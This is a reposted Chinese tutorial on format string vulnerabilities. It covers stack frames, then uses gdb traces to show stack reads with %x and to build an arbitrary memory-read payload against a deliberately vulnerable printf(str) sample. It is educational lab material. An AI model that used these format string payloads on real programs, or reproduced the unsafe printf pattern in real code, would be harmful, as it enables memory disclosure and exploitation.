<!DOCTYPE HTML>

<!--
 ______________ 
< TUICOOL.COM >
 -------------- 
        \   ^__^
         \  (**)\__$__$__
            (__)\       )\/\
             U  ||------|
                ||     ||
-->
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="tc-auth" content="MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451" />
  <meta content="authenticity_token" name="csrf-param" />
<meta content="kXqzXbeXutoqsg4w3VDjXHsJAWF1uju55CWdbulczKM=" name="csrf-token" />
    <title>
            漏洞挖掘基础之格式化字符串 - 推酷
   </title>
    <meta name="description" content="漏洞挖掘基础之格式化字符串"/>
  <link rel="shortcut icon" href="http://static0.tuicool.com/favicon.ico" type="image/x-icon" />
  <link href="http://static0.tuicool.com/images/icon114.png" rel="Bookmark" />
  <link rel="apple-touch-icon" sizes="57x57" href="http://static1.tuicool.com/images/icon57.png" /> 
  <link rel="apple-touch-icon" sizes="72x72" href="http://static2.tuicool.com/images/icon72.png" />  
  <link rel="apple-touch-icon" sizes="114x114" href="http://static0.tuicool.com/images/icon114.png" />    
  <link rel="apple-touch-icon" sizes="144x144" href="http://static1.tuicool.com/images/icon144.png"/>  
  <link href="http://asset.tuicool.com/assets/application-79535689d4effa45d2ea7ede6503dd7f.css" media="screen" rel="stylesheet" type="text/css" />
  <link href="http://static0.tuicool.com/assets/font-awesome.min.css" rel="stylesheet">
  <script src="http://asset.tuicool.com/assets/application-7edeeea3a20493861059090224f774ae.js" type="text/javascript"></script>

  <!--[if IE 7]>
  <link rel="stylesheet" href="http://assets.tuicool.com/assets/font-awesome-ie7.min.css">
  <![endif]--> 
    <script type="text/javascript" src="http://static2.tuicool.com/assets/tip.js?t=3"></script>
  
  <script type="text/javascript" src="http://static1.tuicool.com/assets/spin.min.js"></script>
<link rel="stylesheet" href="http://static0.tuicool.com/assets/github.css">

</head>
<body>
  
  <div id="header" class="navbar-fixed-top">
    <div class="container">
      <div class="navbar">
        <div class="navbar-inner">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"> 
            <span class="icon-bar"></span> 
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span> 
          </a>
          <a href="http://www.tuicool.com/" class="brand">推酷</a>        
        <nav class="nav-collapse collapse">
            <ul class="nav navbar primary-nav">                            
              <li class="active">
                <a href="http://www.tuicool.com/a/">
                  文章
                </a>
              </li>              
              <li class="">
                <a href="http://www.tuicool.com/sites">
                  站点
                </a>
              </li>
              <li class="">
                <a href="http://www.tuicool.com/topics">
                  主题
                </a>
              </li>
              <li class="">
                <a href="http://huodong.tuicool.com/">
                  活动
                </a>
              </li>
                  <li class="">
                    <a href="http://course.tuicool.com/">
                      公开课
                    </a>
                  </li>
              <li class="">
                <a href="http://www.tuicool.com/mobile">
                  APP
                </a>
              </li>
              <li class="dropdown  ">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">周刊 <b class="caret"></b></a>
                <ul class="dropdown-menu">
                  <li><a href="http://www.tuicool.com/mags">编程狂人</a></li>
                  <li><a href="http://www.tuicool.com/mags/design">设计匠艺</a></li> 
                  <li><a href="http://www.tuicool.com/mags/startup">创业周刊</a></li> 
                  <li><a href="http://www.tuicool.com/mags/tech">科技周刊</a></li>      
                  <li><a href="http://www.tuicool.com/mags/guru">Guru Weekly</a></li> 
                  <li><a href="http://www.tuicool.com/articles/weekly">一周拾遗</a></li>                  
                </ul>
              </li>
              
              </ul>
            <form class="navbar-search pull-left" action="http://www.tuicool.com/search">
              <input type="text" class="search-query span2" name="kw" placeholder="搜索">
            </form>
            <ul class="nav pull-right">
                          
                <li class="dropdown">         
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                    <img alt="wolfzhang" src="http://static0.tuicool.com/images/0m.png">
                    wolfzhang
                    <b class="caret"></b>
                  </a>
                  <ul class="dropdown-menu">
                    <li><a href='http://www.tuicool.com/user/462071652'>我的主页</a></li>
                    <li><a href='http://www.tuicool.com/articles/my'>我的收藏</a></li>
                    <li><a href="http://www.tuicool.com/settings">个人设置</a></li>           
                    <li><a href="http://www.tuicool.com/notifications">消息通知</a></li>
                    <li><a href="http://www.tuicool.com/bbs/go/issues">意见反馈</a></li>
                    <li><a href="http://www.tuicool.com/logout">退出</a></li>
                  </ul>
                </li>
            </ul>
          </nav>
        </div>
      </div>
  </div>   
</div>
  <div id ="flash_container" class="noPrint">    
  </div>
  
  <div class="container-fluid">  
      
<div class="row-fluid article_row_fluid">
    <div class="span8 contant article_detail_bg">
        <h1>漏洞挖掘基础之格式化字符串</h1>
        <div class="article_meta">
            <div style="margin-bottom: 5px;">
            <span class="timestamp">时间&nbsp;2015-10-24 20:56:26
            </span>
            <span class="from">
                <i class="icon-globe"></i>
                    <a class="cut cut28 from" href="/sites/juMZbu" target="_blank">安全盒子
                    </a>
            </span>
            </div>
            <div class="source">
                <i style="float:left;">原文</i>&nbsp; 
                <a class="cut cut70" href="http://www.secbox.cn/hacker/7482.html?utm_source=tuicool&amp;utm_medium=referral" style="display:inline-block;">http://www.secbox.cn/hacker/7482.html</a>
            </div>
            <div>
                <span>主题</span>
                <a href="/topics/11010014" target='_blank' >
                    <span class="new-label">gdb</span>
                </a>
            </div>
        </div>
        <div class="article_body" id="nei">
            <div> 
 <h2>0x00 序</h2> 
 <p>格式化字符串漏洞是一个很古老的漏洞了，现在几乎已经见不到这类漏洞的身影，但是作为漏洞分析的初学者来说，还是很有必要研究一下的，因为这是基础啊!!!所以就有了今天这篇文章。我文章都写好了,就差你来跟我搞二进制了!%&gt;.&lt;%</p> 
 <h2>0x01 基础知识---栈</h2> 
 <p>在进行真正的格式化字符串攻击之前，我们需要了解一些基础知识，方便更好的理解该类漏洞。 个人感觉我们还需要一些堆栈相关的基础知识才能更好的理解并运用格式化字符串漏洞。接下来我们就一起看一下栈相关的知识： 说到栈我们不得不提的就是函数调用与参数传递，因为栈的作用就是动态的存储函数之间的调用关系，从而保证在被调用函数返回时能够回到母函数中继续执行。栈 其实是一种数据结构，栈中的数据是先进后出（First In Last Out），常见的操作有两种：</p> 
 <p>压栈（PUSH）和弹栈（POP），</p> 
 <p>用于标识栈属性的也有两个：栈顶（TOP）和栈底（BASE）。</p> 
 <p>PUSH：为栈增加一个元素。</p> 
 <p>POP：从栈中取出一个元素。</p> 
 <p>TOP：标识栈顶的位置，并且是动态变化的，每进行一次push操作，它会自增1，反之，每进行一次pop操作，它会自减1</p> 
 <p>BASE：标识栈底位置，它的位置是不会变动的。</p> 
 <p>函数调用时到底发生了什么呢，我们将通过下面的代码做一下简单的认识。 示例代码：</p> 
 <div> 
  <pre class="prettyprint">int func_B(arg_B1,arg_B2){ int var_B; var_B = arg_B1+arg_B2; return var_B;}int func_A(arg_A1,arg_A2){ int var_A; var_A = func_B(arg_A1,arg_A2); return var_A; }int main (int argc, char **argv, char **envp){ int var_main; var_main=func_A(1,2); return var_main;}</pre> 
  <pre class="prettyprint">intfunc_B(arg_B1,arg_B2)
{
	intvar_B;
	var_B=arg_B1+arg_B2;
	returnvar_B;
}
intfunc_A(arg_A1,arg_A2)
{
     intvar_A;
     var_A=func_B(arg_A1,arg_A2);
     returnvar_A;
}
intmain(intargc,char**argv,char**envp)
{
    intvar_main;
    var_main=func_A(1,2);
    returnvar_main;
}
</pre> 
 </div> 
 <p>程序的执行过程如下图所示：</p> 
 <p> <img src="http://img2.tuicool.com/3muEr2R.jpg!web" class="alignCenter" /> </p> 
 <p>通过上图我们可以看到程序执行的流程：</p> 
 <div> 
  <p>main--func_A--func_B--func_A--main</p> 
 </div> 
 <p>，CPU 在执行程序时是如何知道各个函数之间的调用关系呢，接下来我们将介绍一个新的名词：栈帧。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，这个栈帧 中的内存空间被它所属的函数独占，当函数返回时，系统栈会弹出该函数所对应的栈帧。32位系统下提供了两个特殊的寄存器（ESP和EBP）识栈帧。</p> 
 <ul> 
  <li>ESP:栈指针寄存器，存放一个指针，该指针指向栈顶。</li> 
  <li>EBP:基址指针寄存器，存放一个指针，该指针指向栈底。</li> 
 </ul> 
 <p>CPU利用EBP(不是ESP)寄存器来访问栈内局部变量、参数、函数返回地址，程序运行过程中，ESP寄存器的值随时变化，如果以ESP的值为基 准对栈内的局部变量、参数、返回地址进行访问显然是不可能的，所以在进行函数调用时，先把用作基准的ESP的值保存到EBP，这样以后无论ESP如何变 化，都能够以EBP为基准访问到局部变量、参数以及返回地址。接下来将编译上述代码并进行调试，从而进一步了解函数调用以及参数传递的过程。</p> 
 <p>首先用gcc进行编译：</p> 
 <div> 
  <p>gcc -fno-stack-protector -o 1 1.c</p> 
 </div> 
 <p>用objdump进行反汇编查看：</p> 
 <div>
  objdump -d 1
 </div> 
 <div> 
  <pre class="prettyprint">0804841d &amp;lt;main&amp;gt;: 804841d: 55 push %ebp ;函数开始（保存旧栈帧的底部） 804841e: 89 e5 mov %esp,%ebp ;设置新栈帧底部（切换栈帧） 8048420: 83 ec 10 sub $0x10,%esp ；设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间） 8048423: 6a 02 push $0x2 ；参数入栈（从右往左） 8048425: 6a 01 push $0x1 8048427: e8 d5 ff ff ff call 8048401 &amp;lt;func_A&amp;gt; ；向栈中压入当前指令所在的内存地址，保存返回地址 ；跳转到所调用函数的入口处执行 804842c: 83 c4 08 add $0x8,%esp 804842f: 89 45 fc mov %eax,-0x4(%ebp) 8048432: 8b 45 fc mov -0x4(%ebp),%eax 8048435: c9 leave 8048436: c3 ret 08048401 &amp;lt;func_A&amp;gt;: 8048401: 55 push %ebp 8048402: 89 e5 mov %esp,%ebp 8048404: 83 ec 10 sub $0x10,%esp 8048407: ff 75 0c pushl 0xc(%ebp) 804840a: ff 75 08 pushl 0x8(%ebp) 804840d: e8 d9 ff ff ff call 80483eb &amp;lt;func_B&amp;gt; 8048412: 83 c4 08 add $0x8,%esp 8048415: 89 45 fc mov %eax,-0x4(%ebp) 8048418: 8b 45 fc mov -0x4(%ebp),%eax 804841b: c9 leave 804841c: c3 ret</pre> 
  <pre class="prettyprint">0804841d&lt;main&gt;:
 804841d:  55                      push  %ebp          ;函数开始（保存旧栈帧的底部）
 804841e:  89e5                  mov    %esp,%ebp    ;设置新栈帧底部（切换栈帧）
 8048420:  83ec10                sub    $0x10,%esp    ；设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）
 8048423:  6a02                  push  $0x2          ；参数入栈（从右往左）
 8048425:  6a01                  push  $0x1
 8048427:  e8d5ffffff          call  8048401&lt;func_A&gt;；向栈中压入当前指令所在的内存地址，保存返回地址
                                                          ；跳转到所调用函数的入口处执行
 804842c:  83c408                add    $0x8,%esp
 804842f:  8945fc                mov    %eax,-0x4(%ebp)
 8048432:  8b45fc                mov    -0x4(%ebp),%eax
 8048435:  c9                      leave  
 8048436:  c3                      ret
 
 
 
 08048401&lt;func_A&gt;:
 8048401:  55                      push  %ebp
 8048402:  89e5                  mov    %esp,%ebp
 8048404:  83ec10                sub    $0x10,%esp
 8048407:  ff750c                pushl  0xc(%ebp)
 804840a:  ff7508                pushl  0x8(%ebp)
 804840d:  e8d9ffffff          call  80483eb&lt;func_B&gt;
 8048412:  83c408                add    $0x8,%esp
 8048415:  8945fc                mov    %eax,-0x4(%ebp)
 8048418:  8b45fc                mov    -0x4(%ebp),%eax
 804841b:  c9                      leave  
 804841c:  c3                      ret
</pre> 
 </div> 
 <p>func_A栈帧如下图所示：</p> 
 <p> <img src="http://img1.tuicool.com/Z7FRJzA.jpg!web" class="alignCenter" /> </p> 
 <p>我们将通过以下图例对本次函数调用做一个总结：</p> 
 <p> <img src="http://img2.tuicool.com/M3e6rm2.jpg!web" class="alignCenter" /> </p> 
 <p>通过前面的函数调用细节以及栈中数据的分布情况，我们可以发现局部变量是在栈中挨个排放的，如果这些局部变量中有数组之类的缓冲区，并且程序存在数组越界的问题，那么越界的数组元素就有可能破坏栈中相邻变量的值，进而破坏EBP的值、返回地址等重要数据。</p> 
 <p>因为本次主要讨论的是格式化字符串漏洞，关于栈溢出的细节就不做讨论了，感兴趣的可以查阅相关资料。</p> 
 <p>有了以上的基础知识以后，我们就可以进一步分析格式化字符串漏洞了。</p> 
 <h2>0x02 格式化字符串漏洞原理</h2> 
 <p>格式化串漏洞和普通的栈溢出有相似之处，但又有所不同，它们都是利用了程序员的疏忽大意来改变程序运行的正常流程。</p> 
 <p>接下来我们就来看一下格式化字符串的漏洞原理。</p> 
 <p>首先，什么是格式化字符串呢，print()、fprint()等*print()系列的函数可以按照一定的格式将数据进行输出，举个最简单的例子：</p> 
 <div> 
  <pre>printf(&quot;My Name is: %s&quot; , &quot;bingtangguan&quot;)</pre> 
  <pre>printf(&quot;My Name is:  %s&quot;,&quot;bingtangguan&quot;)</pre> 
 </div> 
 <p>执行该函数后将返回字符串：My Name is：bingtangguan</p> 
 <p>该printf函数的第一个参数就是格式化字符串，它来告诉程序将数据以什么格式输出。上面的例子相信只要学过C语言、上过大学考过计算机二级的都耳熟能详，如果这个都不知道，接下来我真不知道该怎么写了。但是我还是觉得有必要把printf()函数好好写一下。</p> 
 <p>printf()函数的一般形式为：</p> 
 <div> 
  <p>printf(&quot;format&quot;, 输出表列)</p> 
 </div> 
 <p>，我们对format比较关心，看一下它的结构吧：</p> 
 <div> 
  <p>%[标志][输出最小宽度][.精度][长度]类型</p> 
 </div> 
 <p>,其中跟格式化字符串漏洞有关系的主要有以下几点：</p> 
 <p>1、输出最小宽度：用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。</p> 
 <p>2、类型：</p> 
 <ul> 
  <li>d 表示输出十进制整数*</li> 
  <li>s 从内存中读取字符串*</li> 
  <li>x 输出十六进制数*</li> 
  <li>n 输出十六进制数</li> 
 </ul> 
 <p>对于其余内容，感兴趣的自行百度吧。</p> 
 <p>关于printf()函数的使用，正常我们使用printf()函数应该是这样的：</p> 
 <div> 
  <pre>char str[100];scanf(&quot;%s&quot;,str);printf(&quot;%s&quot;,str);</pre> 
  <pre>charstr[100];
scanf(&quot;%s&quot;,str);
printf(&quot;%s&quot;,str);</pre> 
 </div> 
 <p>这是正确的使用方式，但是也有的人会这么用：</p> 
 <div> 
  <pre>char str[100];scanf(&quot;%s&quot;,str);printf(str)</pre> 
  <pre>charstr[100];
scanf(&quot;%s&quot;,str);
printf(str)</pre> 
 </div> 
 <p>然后，悲剧就发生了，我们可以对比一下这两段代码，很明显，第二个程序中的printf()函数参数我们是可控的，我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</p> 
 <h4># 特性一： printf()函数的参数个数不固定</h4> 
 <p>我们可以利用这一特性进行越界数据的访问。我们先看一个正常的程序：</p> 
 <div> 
  <pre class="prettyprint">#include &amp;lt;stdio.h&amp;gt;int main(void){int a=1,b=2,c=3;char buf[]=&quot;test&quot;;printf(&quot;%s %d %d %d\n&quot;,buf,a,b,c);return 0;}</pre> 
  <pre class="prettyprint">#include &lt;stdio.h&gt;
intmain(void)
{
inta=1,b=2,c=3;
charbuf[]=&quot;test&quot;;
printf(&quot;%s %d %d %d\n&quot;,buf,a,b,c);
return0;
}</pre> 
 </div> 
 <p>我们编译之后运行：</p> 
 <div> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$ gcc -fno-stack-protector -o format format.cbingtangguan@ubuntu:~/Desktop/format$ ./format test 1 2 3</pre> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$gcc-fno-stack-protector-oformatformat.c
bingtangguan@ubuntu:~/Desktop/format$./format
test123</pre> 
 </div> 
 <p>接下来我们做一下测试，我们增加一个printf()的format参数，改为：</p> 
 <div> 
  <p>printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b，c)</p> 
 </div> 
 <p>，编译后运行：</p> 
 <div> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$ gcc -z execstack -fno-stack-protector -o format1 format.cformat.c: In function ‘main’:format.c:6:1: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=] printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b,c); ^bingtangguan@ubuntu:~/Desktop/format$ ./format1test 1 2 3 c30000</pre> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$gcc-zexecstack-fno-stack-protector-oformat1format.c
format.c:Infunction‘main’:
format.c:6:1:warning:format‘%x’expectsamatching‘unsignedint’argument[-Wformat=]
printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b,c);
^
bingtangguan@ubuntu:~/Desktop/format$./format1
test123c30000</pre> 
 </div> 
 <p>虽然gcc在编译的时候提示了一个warning，但还是编译通过了，我们运行后发现多输出了一个C30000，这是个什么数据呢，我们用gdb调试一下看看吧，我们在printf()函数处下个断点，然后运行程序，程序停在了</p> 
 <div>
  printf()
 </div> 
 <p>函数入口处</p> 
 <div> 
  <p>0xb7e652f0 __printf+0 push %ebx</p> 
 </div> 
 <p>。大家可能发现了我的gdb 有点不大一样，是因为我用了一个叫做gdb-dashboard的可视化工具，个人感觉还是比较方便的，可以实时的查看寄存器、内存、反汇编等，感兴趣的同学可以去github下载安装一下试试：</p> 
 <div> 
  <p>https://github.com/cyrus-and/gdb-dashboard</p> 
 </div> 
 <div> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$ gdb ./format1GNU gdb (Ubuntu 7.8-1ubuntu4) 7.8.0.20141001-cvsCopyright (C) 2014 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;i686-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.Find the GDB manual and other documentation resources online at:&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from ./format1...(no debugging symbols found)...done.&amp;gt;&amp;gt;&amp;gt; startTemporary breakpoint 1 at 0x8048429Starting program: /home/bingtangguan/Desktop/format/format1 ─── Output/messages ────────────────────────────────────────────────────────────Temporary breakpoint 1, 0x08048429 in main ()─── Assembly ───────────────────────────────────────────────────────────────────0x08048425 main+10 push %ebp0x08048426 main+11 mov %esp,%ebp0x08048428 main+13 push %ecx0x08048429 main+14 sub $0x24,%esp0x0804842c main+17 movl $0x1,-0xc(%ebp)0x08048433 main+24 movl $0x2,-0x10(%ebp)0x0804843a main+31 movl $0x3,-0x14(%ebp)─── Expressions ─────────────────────────────────────────────────────────────────── History ─────────────────────────────────────────────────────────────────────── Memory ──────────────────────────────────────────────────────────────────────── Registers ────────────────────────────────────────────────────────────────── eax 0x00000001 ecx 0xbffff070 edx 0xbffff094 ebx 0xb7fc1000 esp 0xbffff054 ebp 0xbffff058 esi 0x00000000 edi 0x00000000 eip 0x08048429 eflags [ PF SF IF ] cs 0x00000073 ss 0x0000007b ds 0x0000007b es 0x0000007b fs 0x00000000 gs 0x00000033 ─── Source ──────────────────────────────────────────────────────────────────────── Stack ──────────────────────────────────────────────────────────────────────[0] from 0x08048429 in main+14(no arguments)─── Threads ────────────────────────────────────────────────────────────────────[1] id 3590 name format1 from 0x08048429 in main+14────────────────────────────────────────────────────────────────────────────────&amp;gt;&amp;gt;&amp;gt; break printfBreakpoint 2 at 0xb7e652f0: file printf.c, line 28.&amp;gt;&amp;gt;&amp;gt; rStarting program: /home/bingtangguan/Desktop/format/format1 ─── Output/messages ────────────────────────────────────────────────────────────Breakpoint 2, __printf (format=0x8048510 &quot;%s %d %d %d %x\n&quot;) at printf.c:2828 printf.c: No such file or directory.─── Assembly ───────────────────────────────────────────────────────────────────0xb7e652f0 __printf+0 push %ebx0xb7e652f1 __printf+1 sub $0x18,%esp0xb7e652f4 __printf+4 call 0xb7f3d90b &amp;lt;__x86.get_pc_thunk.bx&amp;gt;0xb7e652f9 __printf+9 add $0x15bd07,%ebx─── Expressions ─────────────────────────────────────────────────────────────────── History ─────────────────────────────────────────────────────────────────────── Memory ──────────────────────────────────────────────────────────────────────── Registers ────────────────────────────────────────────────────────────────── eax 0xbffff03f ecx 0xbffff070 edx 0xbffff094 ebx 0xb7fc1000 esp 0xbffff00c ebp 0xbffff058 esi 0x00000000 edi 0x00000000 eip 0xb7e652f0 eflags [ PF ZF IF ] cs 0x00000073 ss 0x0000007b ds 0x0000007b es 0x0000007b fs 0x00000000 gs 0x00000033 ─── Source ─────────────────────────────────────────────────────────────────────Cannot access &quot;/build/buildd/glibc-2.19/stdio-common/printf.c&quot;─── Stack ──────────────────────────────────────────────────────────────────────[0] from 0xb7e652f0 in __printf+0 at printf.c:28arg format = 0x8048510 &quot;%s %d %d %d %x\n&quot;[1] from 0x08048466 in main+75(no arguments)─── Threads ────────────────────────────────────────────────────────────────────[1] id 3594 name format1 from 0xb7e652f0 in __printf+0 at printf.c:28</pre> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$gdb./format1
GNU gdb(Ubuntu7.8-1ubuntu4)7.8.0.20141001-cvs
Copyright(C)2014FreeSoftwareFoundation,Inc.
License GPLv3+:GNUGPLversion3orlater&lt;http://gnu.org/licenses/gpl.html&gt;
Thisisfreesoftware:youarefreetochangeandredistributeit.
There isNOWARRANTY,totheextentpermittedbylaw.  Type&quot;show copying&quot;
and&quot;show warranty&quot;fordetails.
ThisGDBwasconfiguredas&quot;i686-linux-gnu&quot;.
Type&quot;show configuration&quot;forconfigurationdetails.
Forbugreportinginstructions,pleasesee:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find theGDBmanualandotherdocumentationresourcesonlineat:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
Forhelp,type&quot;help&quot;.
Type&quot;apropos word&quot;tosearchforcommandsrelatedto&quot;word&quot;...
Reading symbolsfrom./format1...(nodebuggingsymbolsfound)...done.
&gt;&gt;&gt;start
Temporary breakpoint1at0x8048429
Starting program:/home/bingtangguan/Desktop/format/format1
───Output/messages────────────────────────────────────────────────────────────
Temporary breakpoint1,0x08048429inmain()
───Assembly───────────────────────────────────────────────────────────────────
0x08048425main+10push  %ebp
0x08048426main+11mov	 %esp,%ebp
0x08048428main+13push  %ecx
0x08048429main+14sub	 $0x24,%esp
0x0804842cmain+17movl  $0x1,-0xc(%ebp)
0x08048433main+24movl  $0x2,-0x10(%ebp)
0x0804843amain+31movl  $0x3,-0x14(%ebp)
───Expressions────────────────────────────────────────────────────────────────
───History────────────────────────────────────────────────────────────────────
───Memory─────────────────────────────────────────────────────────────────────
───Registers──────────────────────────────────────────────────────────────────
	eax0x00000001		ecx0xbffff070		edx0xbffff094		ebx0xb7fc1000  
	esp0xbffff054		ebp0xbffff058		esi0x00000000		edi0x00000000  
	eip0x08048429  eflags[PFSFIF]	 cs0x00000073		ss0x0000007b  
	ds0x0000007b		es0x0000007b		fs0x00000000		gs0x00000033  
───Source─────────────────────────────────────────────────────────────────────
───Stack──────────────────────────────────────────────────────────────────────
[0]from0x08048429inmain+14
(noarguments)
───Threads────────────────────────────────────────────────────────────────────
[1]id3590nameformat1from0x08048429inmain+14
────────────────────────────────────────────────────────────────────────────────
&gt;&gt;&gt;breakprintf
Breakpoint2at0xb7e652f0:fileprintf.c,line28.
&gt;&gt;&gt;r
Starting program:/home/bingtangguan/Desktop/format/format1
───Output/messages────────────────────────────────────────────────────────────
Breakpoint2,__printf(format=0x8048510&quot;%s %d %d %d %x\n&quot;)atprintf.c:28
28  printf.c:Nosuchfileordirectory.
───Assembly───────────────────────────────────────────────────────────────────
0xb7e652f0__printf+0push  %ebx
0xb7e652f1__printf+1sub	 $0x18,%esp
0xb7e652f4__printf+4call  0xb7f3d90b&lt;__x86.get_pc_thunk.bx&gt;
0xb7e652f9__printf+9add	 $0x15bd07,%ebx
───Expressions────────────────────────────────────────────────────────────────
───History────────────────────────────────────────────────────────────────────
───Memory─────────────────────────────────────────────────────────────────────
───Registers──────────────────────────────────────────────────────────────────
	eax0xbffff03f		ecx0xbffff070		edx0xbffff094		ebx0xb7fc1000  
	esp0xbffff00c		ebp0xbffff058		esi0x00000000		edi0x00000000  
	eip0xb7e652f0  eflags[PFZFIF]	 cs0x00000073		ss0x0000007b  
	ds0x0000007b		es0x0000007b		fs0x00000000		gs0x00000033  
───Source─────────────────────────────────────────────────────────────────────
Cannot access&quot;/build/buildd/glibc-2.19/stdio-common/printf.c&quot;
───Stack──────────────────────────────────────────────────────────────────────
[0]from0xb7e652f0in__printf+0atprintf.c:28
arg format=0x8048510&quot;%s %d %d %d %x\n&quot;
[1]from0x08048466inmain+75
(noarguments)
───Threads────────────────────────────────────────────────────────────────────
[1]id3594nameformat1from0xb7e652f0in__printf+0atprintf.c:28
</pre> 
 </div> 
 <p>我们查看一下此时的栈布局：</p> 
 <div> 
  <pre class="prettyprint">&amp;gt;&amp;gt;&amp;gt; x/10x $sp0xbffff00c: 0x08048466 0x08048510 0xbffff03f 0x000000010xbffff01c: 0x00000002 0x00000003 0x00c30000 0x000000010xbffff02c: 0x080482bd 0xbffff2c4</pre> 
  <pre class="prettyprint">&gt;&gt;&gt;x/10x$sp
0xbffff00c:0x08048466  0x08048510  0xbffff03f  0x00000001
0xbffff01c:0x00000002  0x00000003  0x00c30000  0x00000001
0xbffff02c:0x080482bd  0xbffff2c4</pre> 
 </div> 
 <p>我们已经看到了0x00c30000，根据第一节我们对栈帧布局的认识，我们可以想象一下调用printf()函数后的栈的布局是什么样的</p> 
 <div> 
  <pre class="prettyprint">&amp;gt;&amp;gt;&amp;gt; x/20x $sp0xbffff00c: 0x08048466 0x08048510 0xbffff03f 0x000000010xbffff01c: 0x00000002 0x00000003 0x00c30000 0x000000010xbffff02c: 0x080482bd 0xbffff2c4 0x0000002f 0x0804a0000xbffff03c: 0x740484d2 0x00747365 0x00000003 0x000000020xbffff04c: 0x00000001 0xb7fc13c4 0xbffff070 0x00000000</pre> 
  <pre class="prettyprint">&gt;&gt;&gt;x/20x$sp
0xbffff00c:0x08048466  0x08048510  0xbffff03f  0x00000001
0xbffff01c:0x00000002  0x00000003  0x00c30000  0x00000001
0xbffff02c:0x080482bd  0xbffff2c4  0x0000002f  0x0804a000
0xbffff03c:0x740484d2  0x00747365  0x00000003  0x00000002
0xbffff04c:0x00000001  0xb7fc13c4  0xbffff070  0x00000000</pre> 
 </div> 
 <p> <img src="http://img0.tuicool.com/vMRZBrB.png!web" class="alignCenter" /> </p> 
 <p>看了上面的图，相信大家已经很明白了吧，只要我们能够控制format的，我们就可以一直读取内存数据。</p> 
 <div> 
  <pre class="prettyprint">printf(&quot;%s %d %d %d %x %x %x %x %x %x %x %x\n&quot;,buf,a,b,c)bingtangguan@ubuntu:~/Desktop/format$ ./format2test 1 2 3 c30000 1 80482bd bf8bf301 2f 804a000 740484d2 747365</pre> 
  <pre class="prettyprint">printf(&quot;%s %d %d %d %x %x %x %x %x %x %x %x\n&quot;,buf,a,b,c)
 
bingtangguan@ubuntu:~/Desktop/format$./format2
test123c30000180482bdbf8bf3012f804a000740484d2747365</pre> 
 </div> 
 <p>上一个例子只是告诉我们可以利用%x一直读取栈内的内存数据，可是这并不能满足我们的需求不是，我们要的是</p> 
 <div>
  任意地址读取
 </div> 
 <p>,当然，这也是可以的，我们通过下面的例子进行分析：</p> 
 <div> 
  <pre class="prettyprint">#include &amp;lt;stdio.h&amp;gt;int main(int argc, char *argv[]){ char str[200]; fgets(str,200,stdin); printf(str); return 0;}</pre> 
  <pre class="prettyprint">#include &lt;stdio.h&gt;
intmain(intargc,char*argv[])
{
    charstr[200];
    fgets(str,200,stdin);
    printf(str);
    return0;
}</pre> 
 </div> 
 <p>有了上一个小例子的经验，我们可以直接尝试去读取str[]的内容呢</p> 
 <p>gdb调试，单步运行完</p> 
 <div> 
  <p>call 0x8048340 &amp;lt;fgets@plt&amp;gt;</p> 
 </div> 
 <p>后输入：</p> 
 <div> 
  <p>AAAA%08x%08x%08x%08x%08x%08x</p> 
 </div> 
 <p>（学过C语言的肯定知道%08x的意义，不明白的也不要紧，可以先看一下后面的特性三，我这里就不再多说了）</p> 
 <p>然后我们执行到printf()函数，观察此时的栈区，特别注意一下0x41414141（这是我们str的开始）：</p> 
 <div> 
  <pre class="prettyprint">&amp;gt;&amp;gt;&amp;gt; x/10x $sp0xbfffef70: 0xbfffef88 0x000000c8 0xb7fc1c20 0xb7e254380xbfffef80: 0x08048210 0x00000001 0x41414141 0x783830250xbfffef90: 0x78383025 0x78383025</pre> 
  <pre class="prettyprint">&gt;&gt;&gt;x/10x$sp
0xbfffef70:0xbfffef88  0x000000c8  0xb7fc1c20  0xb7e25438
0xbfffef80:0x08048210  0x00000001  0x41414141  0x78383025
0xbfffef90:0x78383025  0x78383025</pre> 
 </div> 
 <p>继续执行，看我们能获得什么，我们成功的读到了AAAA：</p> 
 <div> 
  <pre>AAAA000000c8b7fc1c20b7e25438080482100000000141414141</pre> 
  <pre>AAAA000000c8b7fc1c20b7e25438080482100000000141414141</pre> 
 </div> 
 <p>这时候我们需要借助printf()函数的另一个重要的格式化字符参数%s，我们可以用%s来获取指针指向的内存数据。</p> 
 <p>那么我们就可以这么构造尝试去获取0x41414141地址上的数据：</p> 
 <div> 
  <p>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</p> 
 </div> 
